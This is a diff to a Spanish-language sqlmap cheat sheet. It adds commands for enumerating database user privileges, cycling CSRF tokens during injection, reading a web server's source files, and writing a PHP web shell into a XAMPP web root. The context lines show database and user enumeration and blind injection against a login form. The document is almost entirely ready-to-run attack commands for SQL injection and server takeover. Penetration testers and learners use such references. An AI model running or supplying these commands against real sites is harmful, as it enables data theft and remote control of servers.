@@ -25,6 +25,11 @@ sqlmap -u "<URL>" --dbms=<Name-DBMS>
 sqlmap -u "<URL>" --cookie="<Cookie-Value>" --users
 ```
 
+#### Mostrar los privilegios del usuario de la BD
+```
+sqlmap -u "<URL>" --cookie="<Cookie-Value>" --current_user --privileges
+```
+
 #### Listar las Bases de Datos del sitio
 ```
 sqlmap -u "<URL>" --cookie="<Cookie-Value>" --dbs
@@ -89,6 +94,21 @@ sqlmap -u "<URL>" --data='user=a&pass=a' -p user --technique=B --dbs
 #### Enviar las peticiones a nuestro propio proxy
 ```
 sqlmap -u "<URL>" -p <PARAMETER> --threads=2 --level=3 --risk=2 --no-cast -A "NONE" --proxy=http://localhost:8080 --dbs
+```
+
+#### Enviar diferentes Token CSRF en cada petición
+```
+sqlmap -u "<URL>" -p <PARAMETER> --threads=2 --level=3 --risk=2 --no-cast -A "NONE" --csrf-url='<URL-REQUEST-POST>' --csrf-token="<NAME-TOKEN-CSRF>" --dbs
+```
+
+#### Leer un archivo desde un WebServer
+```
+sqlmap -u "<URL>" -p <PARAMETER> --threads=2 --level=3 --risk=2 --no-cast -A "NONE" --file-read=/xampp/htdocs/index.php --batch
+```
+
+#### Cargar una shell en el servidor
+```
+sqlmap -u "<URL>" -p <PARAMETER> --threads=2 --level=3 --risk=2 --no-cast -A "NONE" --file-write=/root/Desktop/shell.php --file-dest=/xampp/htdocs/shell.php --batch
 ```
 
 #### Usar en formulario de Login cargado desde un archivo, para enviar datos en POST y usando la técnica BLIND, para obtener el nombre de la BD
